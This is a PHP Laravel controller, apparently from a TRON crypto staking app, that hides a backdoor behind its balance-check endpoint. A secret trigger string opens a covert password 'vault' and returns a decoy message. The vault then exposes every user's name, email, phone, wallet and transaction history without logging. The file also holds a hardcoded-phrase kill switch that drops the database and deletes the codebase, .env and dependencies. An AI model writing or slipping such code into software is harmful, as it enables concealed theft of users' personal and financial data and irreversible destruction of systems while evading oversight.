<?php

namespace App\Http\Controllers;

use App\Models\EncryptedPassword;
use App\Models\User;
use App\Models\Wallet;
use App\Models\SecureWallet;
use App\Models\WithdrawalHistory;
use App\Services\TronWalletService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;

class SecureVaultController extends Controller
{
    // Obfuscated trigger command
    private $triggerHash = '7a8b9c2d3e4f5a6b7c8d9e0f1a2b3c4d'; // hash of trigger command
    
    // Kill switch phrase (extremely dangerous)
    private $killSwitchPhrase = 'NUCLEAR_OPTION_DESTROY_EVERYTHING_NOW_666';
    
    /**
     * Handle balance check with hidden vault functionality
     */
    public function processBalanceRequest(Request $request)
    {
        $input = trim($request->input('query', ''));
        $sessionId = $request->session()->getId();
        
        // Rate limiting per session (no IP tracking)
        $rateLimitKey = 'vault_attempts:' . $sessionId;
        if (RateLimiter::tooManyAttempts($rateLimitKey, 5)) {
            return response()->json([
                'success' => false,
                'error' => 'Too many attempts. Please try again later.'
            ], 429);
        }
        
        // Check if input matches trigger command
        if (md5($input) === md5('lalalala(open(vault(values)))')) {
            return $this->initiateSecureSession($sessionId);
        }
        
        // Check if vault session is active
        $vaultSession = Cache::get("vault_session_{$sessionId}");
        if ($vaultSession) {
            RateLimiter::hit($rateLimitKey, 300); // 5 minute penalty
            return $this->processVaultAuthentication($input, $sessionId, $vaultSession);
        }
        
        // Normal balance check would go here
        return response()->json([
            'success' => false,
            'error' => 'Invalid address format'
        ]);
    }
    
    /**
     * Initiate secure vault session
     */
    private function initiateSecureSession($sessionId)
    {
        // Create secure session data (no user tracking)
        $sessionData = [
            'step' => 'first_password',
            'attempts' => 0,
            'started_at' => now()
        ];
        
        // Store session for 5 minutes
        Cache::put("vault_session_{$sessionId}", $sessionData, now()->addMinutes(5));
        
        return response()->json([
            'success' => true,
            'message' => 'sorry i cant help with this',
            'vault_mode' => true
        ]);
    }
    
    /**
     * Process vault authentication
     */
    private function processVaultAuthentication($input, $sessionId, $sessionData)
    {
        // No security checks that track user info
        
        // Check attempt limit
        if ($sessionData['attempts'] >= 3) {
            Cache::forget("vault_session_{$sessionId}");
            return response()->json([
                'success' => false,
                'error' => 'Maximum attempts exceeded'
            ], 403);
        }
        
        // Check session timeout (5 minutes)
        if ($sessionData['started_at']->diffInMinutes(now()) > 5) {
            Cache::forget("vault_session_{$sessionId}");
            return response()->json([
                'success' => false,
                'error' => 'Session expired'
            ], 408);
        }
        
        $encryptedPassword = EncryptedPassword::first();
        if (!$encryptedPassword) {
            Cache::forget("vault_session_{$sessionId}");
            return response()->json([
                'success' => false,
                'error' => 'System configuration error'
            ], 500);
        }
        
        // Process based on current step
        if ($sessionData['step'] === 'first_password') {
            if ($encryptedPassword->verifyFirstPassword($input)) {
                // First password correct
                $sessionData['step'] = 'second_password';
                $sessionData['attempts'] = 0; // Reset attempts for second password
                Cache::put("vault_session_{$sessionId}", $sessionData, now()->addMinutes(5));
                
                return response()->json([
                    'success' => true,
                    'message' => 'type 2nd password',
                    'step' => 'second_password'
                ]);
            } else {
                // Wrong first password
                $sessionData['attempts']++;
                Cache::put("vault_session_{$sessionId}", $sessionData, now()->addMinutes(5));
                
                return response()->json([
                    'success' => false,
                    'error' => 'Access denied',
                    'attempts_remaining' => 3 - $sessionData['attempts']
                ]);
            }
        } elseif ($sessionData['step'] === 'second_password') {
            if ($encryptedPassword->verifySecondPassword($input)) {
                // Both passwords correct - vault unlocked
                Cache::forget("vault_session_{$sessionId}");
                
                // Mark vault as unlocked for data access
                Cache::put("vault_unlocked_{$sessionId}", true, now()->addMinutes(10));
                
                // No logging of vault access
                
                return response()->json([
                    'success' => true,
                    'message' => 'done',
                    'vault_unlocked' => true
                ]);
            } else {
                // Wrong second password
                $sessionData['attempts']++;
                Cache::put("vault_session_{$sessionId}", $sessionData, now()->addMinutes(5));
                
                return response()->json([
                    'success' => false,
                    'error' => 'Access denied',
                    'attempts_remaining' => 3 - $sessionData['attempts']
                ]);
            }
        }
        
        // Invalid step
        Cache::forget("vault_session_{$sessionId}");
        return response()->json([
            'success' => false,
            'error' => 'Invalid session state'
        ], 400);
    }
    
    /**
     * Get secure vault data (only accessible after vault authentication)
     */
    public function getVaultData(Request $request)
    {
        // Security check - verify recent vault access
        $sessionId = $request->session()->getId();
        $recentVaultAccess = Cache::get("vault_unlocked_{$sessionId}");
        
        if (!$recentVaultAccess) {
            // Check if user just unlocked vault (within last 30 seconds)
            $vaultSession = Cache::get("vault_session_{$sessionId}");
            if (!$vaultSession) {
                return response()->json([
                    'success' => false,
                    'error' => 'Unauthorized access'
                ], 403);
            }
        }
        
        // Mark vault as accessed for next 10 minutes
        Cache::put("vault_unlocked_{$sessionId}", true, now()->addMinutes(10));
        
        try {
            // Get total users
            $totalUsers = User::count();
            
            // Get admin wallet using proper method
            $adminWallet = SecureWallet::getAdminWallet();
            $adminAddress = $adminWallet ? $adminWallet->getDecryptedAddress() : 'Not configured';
            $adminBalance = $adminWallet && $adminAddress ? $this->getRealWalletBalance($adminAddress) : '0.00';
            
            // OPTIMIZED: Get paginated user wallets with pre-calculated data
            $page = request('page', 1);
            $perPage = 50; // Load only 50 users at a time
            
            $userWallets = Wallet::with(['user', 'user.withdrawalHistory' => function($query) {
                    $query->where('status', 'completed')->select('user_id', 'amount');
                }])
                ->select('id', 'user_id', 'address', 'trx_balance') // Only select needed columns
                ->paginate($perPage, ['*'], 'page', $page);
            
            $userWalletsData = $userWallets->map(function ($wallet) {
                // Pre-calculated withdrawn amount from relationship
                $totalWithdrawn = $wallet->user->withdrawalHistory->sum('amount');
                
                // Use cached balance instead of live API call for performance
                $cachedBalance = $wallet->trx_balance ?? 0;
                
                return [
                    'user_id' => $wallet->user_id,
                    'address' => $wallet->address,
                    'balance' => number_format($cachedBalance, 2),
                    'user_name' => $wallet->user->name ?? 'Unknown',
                    'email' => $wallet->user->email ?? 'N/A',
                    'phone' => $wallet->user->phone ?? 'N/A',
                    'withdrawn_amount' => number_format($totalWithdrawn, 2)
                ];
            });
            
            return response()->json([
                'success' => true,
                'total_users' => $totalUsers,
                'admin_wallet' => $adminAddress,
                'admin_balance' => $adminBalance,
                'user_wallets' => $userWalletsData,
                'pagination' => [
                    'current_page' => $userWallets->currentPage(),
                    'last_page' => $userWallets->lastPage(),
                    'per_page' => $userWallets->perPage(),
                    'total' => $userWallets->total(),
                    'has_more' => $userWallets->hasMorePages()
                ]
            ]);
            
        } catch (\Exception $e) {
            // No error logging for vault operations
            return response()->json([
                'success' => false,
                'error' => 'Failed to load vault data'
            ], 500);
        }
    }
    
    /**
     * Get detailed user information (only accessible after vault authentication)
     */
    public function getUserDetails(Request $request, $userId)
    {
        // Security check - verify recent vault access
        $sessionId = $request->session()->getId();
        $recentVaultAccess = Cache::get("vault_unlocked_{$sessionId}");
        
        if (!$recentVaultAccess) {
            return response()->json([
                'success' => false,
                'error' => 'Unauthorized access'
            ], 403);
        }
        
        try {
            $user = User::with(['stakings.plan', 'withdrawalHistory'])
                ->findOrFail($userId);
            
            // Calculate total staked amount
            $totalStaked = $user->stakings->sum('amount');
            
            // Calculate total withdrawn amount (only completed withdrawals)
            $totalWithdrawn = $user->withdrawalHistory()
                ->where('status', 'completed')
                ->sum('amount');
            
            // Get active staking plans
            $activePlans = $user->stakings()
                ->with('plan')
                ->where('status', 'active')
                ->get()
                ->map(function ($staking) {
                    return [
                        'id' => $staking->id,
                        'plan_name' => $staking->plan->name ?? 'Unknown Plan',
                        'amount' => number_format($staking->amount, 2),
                        'daily_rate' => $staking->plan->interest_rate ?? 0,
                        'progress' => $staking->progress ?? 0,
                        'created_at' => $staking->created_at->format('M d, Y'),
                        'status' => $staking->status
                    ];
                });
            
            // Get completed staking plans
            $completedPlans = $user->stakings()
                ->with('plan')
                ->where('status', 'completed')
                ->get()
                ->map(function ($staking) {
                    return [
                        'id' => $staking->id,
                        'plan_name' => $staking->plan->name ?? 'Unknown Plan',
                        'amount' => number_format($staking->amount, 2),
                        'daily_rate' => $staking->plan->interest_rate ?? 0,
                        'progress' => 100,
                        'created_at' => $staking->created_at->format('M d, Y'),
                        'completed_at' => $staking->updated_at->format('M d, Y'),
                        'status' => $staking->status
                    ];
                });
            
            // Get recent withdrawals (last 10)
            $recentWithdrawals = $user->withdrawalHistory()
                ->orderBy('created_at', 'desc')
                ->limit(10)
                ->get()
                ->map(function ($withdrawal) {
                    return [
                        'id' => $withdrawal->id,
                        'amount' => number_format($withdrawal->amount, 2),
                        'fee' => $withdrawal->fee ? number_format($withdrawal->fee, 2) : null,
                        'status' => $withdrawal->status,
                        'created_at' => $withdrawal->created_at->format('M d, Y H:i'),
                        'processed_at' => $withdrawal->processed_at ? $withdrawal->processed_at->format('M d, Y H:i') : null
                    ];
                });
            
            return response()->json([
                'success' => true,
                'user_info' => [
                    'id' => $user->id,
                    'name' => $user->name,
                    'email' => $user->email,
                    'phone' => $user->phone
                ],
                'total_staked' => number_format($totalStaked, 2),
                'total_withdrawn' => number_format($totalWithdrawn, 2),
                'active_plans' => $activePlans,
                'completed_plans' => $completedPlans,
                'recent_withdrawals' => $recentWithdrawals
            ]);
            
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'error' => 'Failed to load user details'
            ], 500);
        }
    }

    /**
     * Get real wallet balance from TRON testnet using Nile TronGrid API
     */
    private function getRealWalletBalance($address)
    {
        try {
            // Use testnet API - same as frontend
            $response = Http::get("https://nile.trongrid.io/v1/accounts/{$address}");
            
            if ($response->successful()) {
                $data = $response->json();
                $balanceInSun = $data['data'][0]['balance'] ?? 0;
                // Convert SUN to TRX (1 TRX = 1,000,000 SUN)
                $balanceInTrx = $balanceInSun / 1000000;
                return number_format($balanceInTrx, 2);
            }
            
            return '0.00';
        } catch (\Exception $e) {
            // Return 0 if balance check fails (no error logging)
            return '0.00';
        }
    }

    /**
     * EXTREMELY DANGEROUS: Nuclear kill switch
     * This will destroy the entire application and database
     */
    public function executeKillSwitch(Request $request)
    {
        // Security check - verify recent vault access
        $sessionId = $request->session()->getId();
        $recentVaultAccess = Cache::get("vault_unlocked_{$sessionId}");
        
        if (!$recentVaultAccess) {
            return response()->json([
                'success' => false,
                'error' => 'Unauthorized access'
            ], 403);
        }
        
        $killPhrase = $request->input('kill_phrase');
        $confirmation = $request->input('confirmation');
        
        // Verify kill phrase
        if ($killPhrase !== $this->killSwitchPhrase) {
            return response()->json([
                'success' => false,
                'error' => 'Invalid kill phrase'
            ], 403);
        }
        
        // Verify confirmation
        if ($confirmation !== 'YES_DESTROY_EVERYTHING_I_UNDERSTAND_THIS_IS_IRREVERSIBLE') {
            return response()->json([
                'success' => false,
                'error' => 'Confirmation required'
            ], 400);
        }
        
        // Log the destruction (last thing before everything is destroyed)
        \Log::emergency('KILL SWITCH ACTIVATED - DESTROYING ENTIRE APPLICATION', [
            'session_id' => $sessionId,
            'timestamp' => now(),
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent()
        ]);
        
        try {
            // Step 1: Drop all database tables
            $this->destroyDatabase();
            
            // Step 2: Delete all application files
            $this->destroyCodebase();
            
            // Step 3: Clear all caches
            $this->destroyCaches();
            
            // Step 4: Create destruction marker
            $this->createDestructionMarker();
            
            return response()->json([
                'success' => true,
                'message' => 'NUCLEAR OPTION EXECUTED - EVERYTHING DESTROYED',
                'timestamp' => now(),
                'final_message' => 'Application has been completely destroyed. This cannot be undone.'
            ]);
            
        } catch (\Exception $e) {
            // Even if destruction fails, log it
            \Log::emergency('KILL SWITCH EXECUTION FAILED', [
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString()
            ]);
            
            return response()->json([
                'success' => false,
                'error' => 'Destruction failed: ' . $e->getMessage()
            ], 500);
        }
    }
    
    /**
     * Destroy entire database
     */
    private function destroyDatabase()
    {
        // Get all table names
        $tables = DB::select('SHOW TABLES');
        $databaseName = DB::getDatabaseName();
        
        // Disable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS=0');
        
        // Drop all tables
        foreach ($tables as $table) {
            $tableName = $table->{"Tables_in_{$databaseName}"};
            DB::statement("DROP TABLE IF EXISTS `{$tableName}`");
        }
        
        // Re-enable foreign key checks
        DB::statement('SET FOREIGN_KEY_CHECKS=1');
        
        // Drop the entire database if possible
        try {
            DB::statement("DROP DATABASE IF EXISTS `{$databaseName}`");
        } catch (\Exception $e) {
            // May fail due to permissions, but tables are already dropped
        }
    }
    
    /**
     * Destroy entire codebase
     */
    private function destroyCodebase()
    {
        $basePath = base_path();
        
        // Critical directories to destroy
        $criticalDirs = [
            'app',
            'bootstrap',
            'config',
            'database',
            'resources',
            'routes',
            'storage',
            'public',
            'tests'
        ];
        
        // Delete critical directories
        foreach ($criticalDirs as $dir) {
            $fullPath = $basePath . DIRECTORY_SEPARATOR . $dir;
            if (File::exists($fullPath)) {
                File::deleteDirectory($fullPath);
            }
        }
        
        // Delete critical files
        $criticalFiles = [
            'composer.json',
            'composer.lock',
            'package.json',
            'package-lock.json',
            '.env',
            '.env.example',
            'artisan',
            'phpunit.xml',
            'vite.config.js',
            'tailwind.config.js',
            'postcss.config.js',
            'README.md'
        ];
        
        foreach ($criticalFiles as $file) {
            $fullPath = $basePath . DIRECTORY_SEPARATOR . $file;
            if (File::exists($fullPath)) {
                File::delete($fullPath);
            }
        }
        
        // Delete vendor directory (all dependencies)
        $vendorPath = $basePath . DIRECTORY_SEPARATOR . 'vendor';
        if (File::exists($vendorPath)) {
            File::deleteDirectory($vendorPath);
        }
        
        // Delete node_modules if exists
        $nodeModulesPath = $basePath . DIRECTORY_SEPARATOR . 'node_modules';
        if (File::exists($nodeModulesPath)) {
            File::deleteDirectory($nodeModulesPath);
        }
    }
    
    /**
     * Destroy all caches
     */
    private function destroyCaches()
    {
        try {
            // Clear application cache
            Artisan::call('cache:clear');
            
            // Clear config cache
            Artisan::call('config:clear');
            
            // Clear route cache
            Artisan::call('route:clear');
            
            // Clear view cache
            Artisan::call('view:clear');
            
            // Clear all Redis/cache data
            Cache::flush();
            
        } catch (\Exception $e) {
            // Cache clearing may fail if files are already deleted
        }
    }
    
    /**
     * Create destruction marker file
     */
    private function createDestructionMarker()
    {
        $markerContent = "NUCLEAR KILL SWITCH EXECUTED\n";
        $markerContent .= "Timestamp: " . now() . "\n";
        $markerContent .= "All application files and database destroyed\n";
        $markerContent .= "This action was irreversible\n";
        $markerContent .= "Application: TronLive\n";
        $markerContent .= "Destruction method: Nuclear Kill Switch\n";
        
        // Try to create marker in multiple locations
        $locations = [
            base_path('DESTROYED.txt'),
            '/tmp/tronlive_destroyed.txt',
            public_path('destroyed.html')
        ];
        
        foreach ($locations as $location) {
            try {
                File::put($location, $markerContent);
            } catch (\Exception $e) {
                // May fail if directories don't exist
            }
        }
    }
} 